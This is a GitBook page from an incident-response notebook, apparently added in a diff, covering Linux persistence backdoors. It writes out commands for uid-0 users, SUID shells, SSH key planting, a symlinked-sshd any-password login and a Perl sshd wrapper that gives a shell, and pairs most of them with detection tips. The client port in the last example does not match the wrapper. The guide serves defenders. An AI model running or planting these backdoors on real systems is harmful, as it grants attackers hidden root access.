@@ -1,0 +1,1061 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>第4篇：Linux权限维持--后门篇 · 应急响应实战笔记</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Bypass">
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="第5篇：Windows命令行文件下载方式汇总.html" />
+    
+    
+    <link rel="prev" href="第3篇：Linux权限维持--隐藏篇.html" />
+    
+
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"buttons":[{"user":"Bypass007","repo":"Emergency-Response-Notes","type":"star","size":"small","count":true}]};
+    </script>
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    前言
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../Summary/">
+            
+                <a href="../Summary/">
+            
+                    
+                    第一章：应急响应
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../Summary/第1篇：Window入侵排查.html">
+            
+                <a href="../Summary/第1篇：Window入侵排查.html">
+            
+                    
+                    第1篇：Window入侵排查
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../Summary/第2篇：Linux入侵排查.html">
+            
+                <a href="../Summary/第2篇：Linux入侵排查.html">
+            
+                    
+                    第2篇：Linux入侵排查
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../Summary/第3篇：常见的Webshell查杀工具.html">
+            
+                <a href="../Summary/第3篇：常见的Webshell查杀工具.html">
+            
+                    
+                    第3篇：常见的Webshell查杀工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../Summary/第4篇：如何发现隐藏的Webshell后门.html">
+            
+                <a href="../Summary/第4篇：如何发现隐藏的Webshell后门.html">
+            
+                    
+                    第4篇：如何发现隐藏的Webshell后门
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../Summary/第5篇：勒索病毒自救指南.html">
+            
+                <a href="../Summary/第5篇：勒索病毒自救指南.html">
+            
+                    
+                    第5篇：勒索病毒自救指南
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../LogAnalysis/">
+            
+                <a href="../LogAnalysis/">
+            
+                    
+                    第二章：日志分析
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../LogAnalysis/第1篇：Window日志分析.html">
+            
+                <a href="../LogAnalysis/第1篇：Window日志分析.html">
+            
+                    
+                    第1篇:Window日志分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../LogAnalysis/第2篇：Linux日志分析.html">
+            
+                <a href="../LogAnalysis/第2篇：Linux日志分析.html">
+            
+                    
+                    第2篇:Linux日志分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../LogAnalysis/第3篇：Web日志分析.html">
+            
+                <a href="../LogAnalysis/第3篇：Web日志分析.html">
+            
+                    
+                    第3篇:Web日志分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../LogAnalysis/第4篇：MSSQL日志分析.html">
+            
+                <a href="../LogAnalysis/第4篇：MSSQL日志分析.html">
+            
+                    
+                    第4篇:MSSQL日志分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../LogAnalysis/第5篇：MySQL日志分析.html">
+            
+                <a href="../LogAnalysis/第5篇：MySQL日志分析.html">
+            
+                    
+                    第5篇:MySQL日志分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    第三章：权限维持篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="第1篇：Windows权限维持--隐藏篇.html">
+            
+                <a href="第1篇：Windows权限维持--隐藏篇.html">
+            
+                    
+                    第1篇：Windows权限维持--隐藏篇
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="第2篇：Windows权限维持--后门篇.html">
+            
+                <a href="第2篇：Windows权限维持--后门篇.html">
+            
+                    
+                    第2篇：Windows权限维持--后门篇
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="第3篇：Linux权限维持--隐藏篇.html">
+            
+                <a href="第3篇：Linux权限维持--隐藏篇.html">
+            
+                    
+                    第3篇：Linux权限维持--隐藏篇
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.4.4" data-path="第4篇：Linux权限维持--后门篇.html">
+            
+                <a href="第4篇：Linux权限维持--后门篇.html">
+            
+                    
+                    第4篇：Linux权限维持--后门篇
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="第5篇：Windows命令行文件下载方式汇总.html">
+            
+                <a href="第5篇：Windows命令行文件下载方式汇总.html">
+            
+                    
+                    第5篇：Windows命令行文件下载方式汇总
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" data-path="第6篇：三大渗透测试框架权限维持技术.html">
+            
+                <a href="第6篇：三大渗透测试框架权限维持技术.html">
+            
+                    
+                    第6篇：三大渗透测试框架权限维持技术
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.7" data-path="第7篇：常见WebShell管理工具.html">
+            
+                <a href="第7篇：常见WebShell管理工具.html">
+            
+                    
+                    第7篇：常见WebShell管理工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../Windows/">
+            
+                <a href="../Windows/">
+            
+                    
+                    第四章：Windows实战篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../Windows/第1篇：FTP暴力破解.html">
+            
+                <a href="../Windows/第1篇：FTP暴力破解.html">
+            
+                    
+                    第1篇：FTP暴力破解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../Windows/第2篇：蠕虫病毒.html">
+            
+                <a href="../Windows/第2篇：蠕虫病毒.html">
+            
+                    
+                    第2篇：蠕虫病毒
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../Windows/第3篇：勒索病毒.html">
+            
+                <a href="../Windows/第3篇：勒索病毒.html">
+            
+                    
+                    第3篇：勒索病毒
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../Windows/第4篇：ARP病毒.html">
+            
+                <a href="../Windows/第4篇：ARP病毒.html">
+            
+                    
+                    第4篇：ARP病毒
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../Windows/第5篇：挖矿病毒（一）.html">
+            
+                <a href="../Windows/第5篇：挖矿病毒（一）.html">
+            
+                    
+                    第5篇：挖矿病毒（一）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../Windows/第6篇：挖矿病毒（二）.html">
+            
+                <a href="../Windows/第6篇：挖矿病毒（二）.html">
+            
+                    
+                    第6篇：挖矿病毒（二）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../Linux/">
+            
+                <a href="../Linux/">
+            
+                    
+                    第五章：Linux实战篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../Linux/第1篇：SSH暴力破解.html">
+            
+                <a href="../Linux/第1篇：SSH暴力破解.html">
+            
+                    
+                    第1篇：SSH暴力破解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="../Linux/第2篇：捕捉短连接.html">
+            
+                <a href="../Linux/第2篇：捕捉短连接.html">
+            
+                    
+                    第2篇：捕捉短连接
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="../Linux/第3篇：挖矿病毒.html">
+            
+                <a href="../Linux/第3篇：挖矿病毒.html">
+            
+                    
+                    第3篇：挖矿病毒
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.4" data-path="../Linux/第4篇：盖茨木马.html">
+            
+                <a href="../Linux/第4篇：盖茨木马.html">
+            
+                    
+                    第4篇：盖茨木马
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.5" data-path="../Linux/第5篇：DDOS病毒.html">
+            
+                <a href="../Linux/第5篇：DDOS病毒.html">
+            
+                    
+                    第5篇：DDOS病毒
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../Web/">
+            
+                <a href="../Web/">
+            
+                    
+                    第六章：Web实战篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../Web/第1篇：网站被植入Webshell.html">
+            
+                <a href="../Web/第1篇：网站被植入Webshell.html">
+            
+                    
+                    第1篇：网站被植入Webshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="../Web/第2篇：门罗币恶意挖矿.html">
+            
+                <a href="../Web/第2篇：门罗币恶意挖矿.html">
+            
+                    
+                    第2篇：门罗币恶意挖矿
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="../Web/第3篇：批量挂黑页.html">
+            
+                <a href="../Web/第3篇：批量挂黑页.html">
+            
+                    
+                    第3篇：批量挂黑页
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.4" data-path="../Web/第4篇：新闻源网站劫持.html">
+            
+                <a href="../Web/第4篇：新闻源网站劫持.html">
+            
+                    
+                    第4篇：新闻源网站劫持
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.5" data-path="../Web/第5篇：移动端劫持.html">
+            
+                <a href="../Web/第5篇：移动端劫持.html">
+            
+                    
+                    第5篇：移动端劫持
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.6" data-path="../Web/第6篇：搜索引擎劫持.html">
+            
+                <a href="../Web/第6篇：搜索引擎劫持.html">
+            
+                    
+                    第6篇：搜索引擎劫持
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.7" data-path="../Web/第7篇：网站首页被篡改.html">
+            
+                <a href="../Web/第7篇：网站首页被篡改.html">
+            
+                    
+                    第7篇：网站首页被篡改
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.8" data-path="../Web/第8篇：管理员账号被篡改.html">
+            
+                <a href="../Web/第8篇：管理员账号被篡改.html">
+            
+                    
+                    第8篇：管理员账号被篡改
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.9" data-path="../Web/第9篇：编辑器入侵事件.html">
+            
+                <a href="../Web/第9篇：编辑器入侵事件.html">
+            
+                    
+                    第9篇：编辑器入侵事件
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >第4篇：Linux权限维持--后门篇</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h2 id="&#x7B2C;4&#x7BC7;&#xFF1A;linux&#x6743;&#x9650;&#x7EF4;&#x6301;--&#x540E;&#x95E8;&#x7BC7;">&#x7B2C;4&#x7BC7;&#xFF1A;Linux&#x6743;&#x9650;&#x7EF4;&#x6301;--&#x540E;&#x95E8;&#x7BC7;</h2>
+<p>&#x672C;&#x6587;&#x5C06;&#x5BF9;Linux&#x4E0B;&#x5E38;&#x89C1;&#x7684;&#x6743;&#x9650;&#x7EF4;&#x6301;&#x6280;&#x672F;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#xFF0C;&#x77E5;&#x5DF1;&#x77E5;&#x5F7C;&#x767E;&#x6218;&#x4E0D;&#x6B86;&#x3002;</p>
+<p><strong>1&#x3001;&#x4E00;&#x53E5;&#x8BDD;&#x6DFB;&#x52A0;&#x7528;&#x6237;&#x548C;&#x5BC6;&#x7801;</strong></p>
+<p>&#x6DFB;&#x52A0;&#x666E;&#x901A;&#x7528;&#x6237;&#xFF1A;</p>
+<pre><code># &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x540D;guest&#xFF0C;&#x5BC6;&#x7801;123456&#x7684;&#x666E;&#x901A;&#x7528;&#x6237;
+useradd -p `openssl passwd -1 -salt &apos;salt&apos; 123456` guest
+
+# useradd -p &#x65B9;&#x6CD5;  ` ` &#x662F;&#x7528;&#x6765;&#x5B58;&#x653E;&#x53EF;&#x6267;&#x884C;&#x7684;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;,&quot;$()&quot;&#x4E5F;&#x53EF;&#x4EE5;&#x5B58;&#x653E;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8BED;&#x53E5;
+useradd -p &quot;$(openssl passwd -1 123456)&quot; guest
+
+# chpasswd&#x65B9;&#x6CD5;
+useradd guest;echo &apos;guest:123456&apos;|chpasswd
+
+# echo -e&#x65B9;&#x6CD5;
+useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test
+</code></pre><p>&#x6DFB;&#x52A0;root&#x7528;&#x6237;&#xFF1A;</p>
+<pre><code># &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x540D;guest&#xFF0C;&#x5BC6;&#x7801;123456&#x7684;root&#x7528;&#x6237;
+useradd -p `openssl passwd -1 -salt &apos;salt&apos; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test
+</code></pre><p>&#x53EF;&#x7591;&#x7528;&#x6237;&#x6392;&#x67E5;&#x6280;&#x5DE7;&#xFF1A;</p>
+<pre><code># &#x67E5;&#x8BE2;&#x7279;&#x6743;&#x7528;&#x6237;&#x7279;&#x6743;&#x7528;&#x6237;(uid &#x4E3A;0)
+[root@localhost ~]# awk -F: &apos;$3==0{print $1}&apos; /etc/passwd
+# &#x67E5;&#x8BE2;&#x53EF;&#x4EE5;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#x7684;&#x5E10;&#x53F7;&#x4FE1;&#x606F;
+[root@localhost ~]# awk &apos;/\$1|\$6/{print $1}&apos; /etc/shadow
+# &#x9664;root&#x5E10;&#x53F7;&#x5916;&#xFF0C;&#x5176;&#x4ED6;&#x5E10;&#x53F7;&#x662F;&#x5426;&#x5B58;&#x5728;sudo&#x6743;&#x9650;&#x3002;&#x5982;&#x975E;&#x7BA1;&#x7406;&#x9700;&#x8981;&#xFF0C;&#x666E;&#x901A;&#x5E10;&#x53F7;&#x5E94;&#x5220;&#x9664;sudo&#x6743;&#x9650;
+[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;
+</code></pre><p><strong>2&#x3001;SUID Shell</strong></p>
+<p>Suid shell&#x662F;&#x4E00;&#x79CD;&#x53EF;&#x7528;&#x4E8E;&#x4EE5;&#x62E5;&#x6709;&#x8005;&#x6743;&#x9650;&#x8FD0;&#x884C;&#x7684;shell&#x3002;</p>
+<pre><code>&#x914D;&#x5408;&#x666E;&#x901A;&#x7528;&#x6237;&#x6743;&#x9650;&#x4F7F;&#x7528;
+cp /bin/bash /tmp/shell
+chmod u+s /tmp/shell
+</code></pre><p>&#x4F7F;&#x7528;guest&#x7528;&#x6237;&#x767B;&#x5F55;&#x5C31;&#x53EF;&#x7591;&#x83B7;&#x53D6;root&#x6743;&#x9650;&#x3002;</p>
+<p><img src="image/privilege-5-1.png" alt=""></p>
+<p>&#x5907;&#x6CE8;&#xFF1A;bash2&#x9488;&#x5BF9;suid&#x505A;&#x4E86;&#x4E00;&#x4E9B;&#x9632;&#x62A4;&#x63AA;&#x65BD;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;-p&#x53C2;&#x6570;&#x6765;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;root shell&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x666E;&#x901A;&#x7528;&#x6237;&#x6267;&#x884C;&#x8FD9;&#x4E2A;SUID shell&#x65F6;&#xFF0C;&#x4E00;&#x5B9A;&#x8981;&#x4F7F;&#x7528;&#x5168;&#x8DEF;&#x5F84;&#x3002;</p>
+<p>&#x6392;&#x67E5;&#x6280;&#x5DE7;&#xFF1A;</p>
+<pre><code># &#x5728;Linux&#x4E2D;&#x67E5;&#x627E;SUID&#x8BBE;&#x7F6E;&#x7684;&#x6587;&#x4EF6;
+find . -perm /4000 
+# &#x5728;Linux&#x4E2D;&#x67E5;&#x627E;&#x4F7F;&#x7528;SGID&#x8BBE;&#x7F6E;&#x7684;&#x6587;&#x4EF6;
+find . -perm /2000
+# &#x53D6;&#x6D88;s&#x6743;&#x9650;
+chmod u-s /tmp/shell
+</code></pre><p><strong>3&#x3001;ssh&#x516C;&#x79C1;&#x94A5;&#x514D;&#x5BC6;&#x767B;&#x5F55;</strong></p>
+<p>&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x4E0A;&#x751F;&#x6210;&#x4E00;&#x5BF9;&#x516C;&#x79C1;&#x94A5;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x516C;&#x94A5;&#x653E;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF08;~/.ssh/authorized_keys&#xFF09;&#xFF0C;&#x4FDD;&#x7559;&#x79C1;&#x94A5;&#x3002;&#x5F53;ssh&#x767B;&#x5F55;&#x65F6;&#xFF0C;ssh&#x7A0B;&#x5E8F;&#x4F1A;&#x53D1;&#x9001;&#x79C1;&#x94A5;&#x53BB;&#x548C;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x516C;&#x94A5;&#x505A;&#x5339;&#x914D;&#x3002;&#x5982;&#x679C;&#x5339;&#x914D;&#x6210;&#x529F;&#x5C31;&#x53EF;&#x4EE5;&#x767B;&#x5F55;&#x4E86;&#x3002;</p>
+<p>&#x5BA2;&#x6237;&#x7AEF;&#xFF1A;</p>
+<pre><code>ssh-keygen -t rsa
+</code></pre><p>&#x8FC7;&#x7A0B;&#x4E2D;&#x6309;&#x4E09;&#x6B21;&#x56DE;&#x8F66;&#xFF0C;&#x6267;&#x884C;&#x7ED3;&#x675F;&#x5982;&#x4E0B;&#x56FE;:</p>
+<p><img src="image/privilege-5-2.png" alt=""></p>
+<p>&#x8FDB;&#x5165;/root/.ssh/&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x5939;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>
+<p><img src="image/privilege-5-3.png" alt=""></p>
+<p>&#x5176;&#x4E2D; <code>id_rsa</code>&#x4E3A;&#x79C1;&#x94A5;&#xFF0C;<code>id_rsa.pub</code>&#x4E3A;&#x516C;&#x94A5;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x6253;&#x5F00;<code>id_rsa.pub</code>&#xFF0C;&#x5C06;&#x5185;&#x5BB9;&#x590D;&#x5236;&#x5230;&#x670D;&#x52A1;&#x5668;&#x3002;&#x5C06;<code>id_rsa.pub</code>&#x7684;&#x5185;&#x5BB9;&#x8FFD;&#x52A0;&#x5230;<code>/root/.ssh/authorized_keys</code>&#x5185;&#xFF0C;&#x914D;&#x7F6E;&#x5B8C;&#x6210;&#x3002;</p>
+<p>&#x6392;&#x67E5;&#x6280;&#x5DE7;&#xFF1A;&#x67E5;&#x770B;<code>/root/.ssh/authorized_keys</code>&#x662F;&#x5426;&#x88AB;&#x4FEE;&#x6539;&#x3002;</p>
+<p><strong>4&#x3001;&#x8F6F;&#x8FDE;&#x63A5;</strong></p>
+<p>&#x5728;sshd&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x8FD0;&#x884C;PAM&#x8BA4;&#x8BC1;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;PAM&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x63A7;&#x5236;&#x6807;&#x5FD7;&#x4E3A;sufficient&#x65F6;&#x53EA;&#x8981;pam_rootok&#x6A21;&#x5757;&#x68C0;&#x6D4B;uid&#x4E3A;0&#x5373;root&#x6743;&#x9650;&#x5373;&#x53EF;&#x6210;&#x529F;&#x8BA4;&#x8BC1;&#x767B;&#x9646;&#x3002;&#x901A;&#x8FC7;&#x8F6F;&#x8FDE;&#x63A5;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x5B9E;&#x8D28;&#x4E0A;PAM&#x8BA4;&#x8BC1;&#x662F;&#x901A;&#x8FC7;&#x8F6F;&#x8FDE;&#x63A5;&#x7684;&#x6587;&#x4EF6;&#x540D; <code>/tmp/su</code> &#x5728;<code>/etc/pam.d/</code>&#x76EE;&#x5F55;&#x4E0B;&#x5BFB;&#x627E;&#x5BF9;&#x5E94;&#x7684;PAM&#x914D;&#x7F6E;&#x6587;&#x4EF6;(&#x5982;: /etc/pam.d/su)&#xFF0C;&#x4EFB;&#x610F;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x7684;&#x6838;&#x5FC3;&#x662F;<code>auth sufficient pam_rootok.so</code>&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x8981;PAM&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x5305;&#x542B;&#x6B64;&#x914D;&#x7F6E;&#x5373;&#x53EF;SSH&#x4EFB;&#x610F;&#x5BC6;&#x7801;&#x767B;&#x9646;&#xFF0C;&#x9664;&#x4E86;su&#x4E2D;&#x4E4B;&#x5916;&#x8FD8;&#x6709;chsh&#x3001;chfn&#x540C;&#x6837;&#x53EF;&#x4EE5;&#x3002;</p>
+<p>&#x5728;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6267;&#x884C;&#x4E00;&#x53E5;&#x8BDD;&#x540E;&#x95E8;&#xFF1A;</p>
+<pre><code>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888
+</code></pre><p>&#x6267;&#x884C;&#x5B8C;&#x4E4B;&#x540E;&#xFF0C;&#x4EFB;&#x4F55;&#x4E00;&#x53F0;&#x673A;&#x5668;<code>ssh root@IP -p 8888</code>&#xFF0C;&#x8F93;&#x5165;&#x4EFB;&#x610F;&#x5BC6;&#x7801;&#xFF0C;&#x6210;&#x529F;&#x767B;&#x5F55;&#x3002;</p>
+<p><img src="image/privilege-5-4.png" alt=""></p>
+<p>&#x6392;&#x67E5;&#x6280;&#x5DE7;&#xFF1A;&#x8FDB;&#x7A0B;&#x3001;&#x7AEF;&#x53E3;&#x90FD;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x5F02;&#x5E38;&#xFF0C; kill -s 9 PID &#x7ED3;&#x675F;&#x8FDB;&#x7A0B;&#x5373;&#x53EF;&#x6E05;&#x9664;&#x540E;&#x95E8;&#x3002;</p>
+<p><img src="image/privilege-5-4-1.png" alt=""></p>
+<p><strong>5&#x3001;SSH wrapper</strong></p>
+<p>&#x9996;&#x5148;&#x542F;&#x52A8;&#x7684;&#x662F;/usr/sbin/sshd,&#x811A;&#x672C;&#x6267;&#x884C;&#x5230;getpeername&#x8FD9;&#x91CC;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6B63;&#x5219;&#x5339;&#x914D;&#x4F1A;&#x5931;&#x8D25;&#xFF0C;&#x4E8E;&#x662F;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x53E5;&#xFF0C;&#x542F;&#x52A8;/usr/bin/sshd&#xFF0C;&#x8FD9;&#x662F;&#x539F;&#x59CB;sshd&#x3002;&#x539F;&#x59CB;&#x7684;sshd&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x5EFA;&#x7ACB;&#x4E86;tcp&#x8FDE;&#x63A5;&#x540E;&#xFF0C;&#x4F1A;fork&#x4E00;&#x4E2A;&#x5B50;&#x8FDB;&#x7A0B;&#x5904;&#x7406;&#x5177;&#x4F53;&#x5DE5;&#x4F5C;&#x3002;&#x8FD9;&#x4E2A;&#x5B50;&#x8FDB;&#x7A0B;&#xFF0C;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x68C0;&#x9A8C;&#xFF0C;&#x800C;&#x662F;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x7684;&#x4F4D;&#x7F6E;&#x7684;/usr/sbin/sshd&#xFF0C;&#x8FD9;&#x6837;&#x5B50;&#x63A7;&#x5236;&#x6743;&#x53C8;&#x56DE;&#x5230;&#x811A;&#x672C;&#x4E86;&#x3002;&#x6B64;&#x65F6;&#x5B50;&#x8FDB;&#x7A0B;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x5DF2;&#x88AB;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x5957;&#x63A5;&#x5B57;&#xFF0C;getpeername&#x80FD;&#x771F;&#x7684;&#x83B7;&#x53D6;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;TCP&#x6E90;&#x7AEF;&#x53E3;&#xFF0C;&#x5982;&#x679C;&#x662F;19526&#x5C31;&#x6267;&#x884C;sh&#x7ED9;&#x4E2A;shell</p>
+<p>&#x7B80;&#x5355;&#x70B9;&#x5C31;&#x662F;&#x4ECE;sshd fork&#x51FA;&#x4E00;&#x4E2A;&#x5B50;&#x8FDB;&#x7A0B;&#xFF0C;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x5957;&#x63A5;&#x5B57;&#xFF0C;&#x5E76;&#x5BF9;&#x8FDE;&#x8FC7;&#x6765;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x7AEF;&#x53E3;&#x8FDB;&#x884C;&#x4E86;&#x5224;&#x65AD;&#x3002;</p>
+<p>&#x670D;&#x52A1;&#x7AEF;&#xFF1A;</p>
+<pre><code>cd /usr/sbin/
+mv sshd ../bin/
+echo &apos;#!/usr/bin/perl&apos; &gt;sshd
+echo &apos;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd
+echo &apos;exec{&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd
+chmod u+x sshd
+/etc/init.d/sshd restart
+</code></pre><p>&#x5BA2;&#x6237;&#x7AEF;&#xFF1A;</p>
+<pre><code>socat STDIO TCP4:target_ip:22,sourceport=13377
+
